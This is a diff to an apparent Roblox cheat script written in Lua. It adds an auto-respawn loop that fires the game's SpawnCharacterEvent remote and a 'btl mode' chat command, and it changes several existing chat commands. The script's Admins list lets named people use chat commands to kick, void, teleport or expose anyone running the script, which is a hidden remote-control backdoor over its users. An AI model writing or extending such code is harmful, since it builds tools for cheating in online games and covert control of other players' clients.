@@ -19,6 +19,8 @@ local Admins = {
 local OrigSize = Vector3.new(89.47997283935547, 0.05000000074505806, 38.62000274658203)
 local FFConnection = false
 local BlindGui = nil
+local AutoRespawn = false
+local RespawnConnection = nil
 
 local function SwordEquipper()
     local Backpack = LocalPlayer:FindFirstChild("Backpack")
@@ -41,17 +43,55 @@ local function FFChecker()
     end
 end
 
+local function StartAutoRespawn()
+    if RespawnConnection then RespawnConnection:Disconnect() end
+    RespawnConnection = LocalPlayer.CharacterAdded:Connect(function()
+    end)
+    task.spawn(function()
+        while AutoRespawn do
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                if LocalPlayer.Character.Humanoid.Health <= 0 then
+                    game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):WaitForChild("SpawnCharacterEvent"):FireServer("MainSpawn")
+                end
+            end
+            task.wait(0.5)
+        end
+    end)
+end
+
+local function StopAutoRespawn()
+    AutoRespawn = false
+    if RespawnConnection then
+        RespawnConnection:Disconnect()
+        RespawnConnection = nil
+    end
+end
+
 local function ChatCommand(speakerName, message)
     if Admins[speakerName] then
+
+        local btlModePlayer, btlModeState = message:lower():match("btl mode,%s*([%w_]+)%s*(true)")
+        if btlModePlayer and btlModeState and LocalPlayer.Name:lower():find(btlModePlayer:lower()) then
+            AutoRespawn = true
+            StartAutoRespawn()
+        end
+
+        local btlModePlayerStop, btlModeStateStop = message:lower():match("btl mode,%s*([%w_]+)%s*(false)")
+        if btlModePlayerStop and btlModeStateStop and LocalPlayer.Name:lower():find(btlModePlayerStop:lower()) then
+            StopAutoRespawn()
+        end
+
         local match1 = message:lower():match("//kick%s+([%w_]+)")
         if match1 and LocalPlayer.Name:lower():find(match1) then
             LocalPlayer:Kick("Araa and Braxy did not allow you to use this script.")
         end
 
-        local match2 = message:lower():match("//revealusers")
+        local match2 = message:lower():find("//revealusers")
         if match2 then
-            wait(0.5)
-            ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Me", "All")
+            TextChatService:SendAsync({
+                Text = "Me",
+                Channel = "RBXGeneral"
+            })
         end
 
         local match3 = message:lower():match("//void%s+([%w_]+)")
@@ -159,7 +199,7 @@ local function ChatCommand(speakerName, message)
                 end
             end
         end
-        local match12 = message:lower():match("//rejoin%s+([%w_]+)")
+        local match12 = message:lower():match("//rj%s+([%w_]+)")
         if match12 and LocalPlayer.Name:lower():find(match12) then
             TeleportService:Teleport(PlaceId, LocalPlayer)
         end
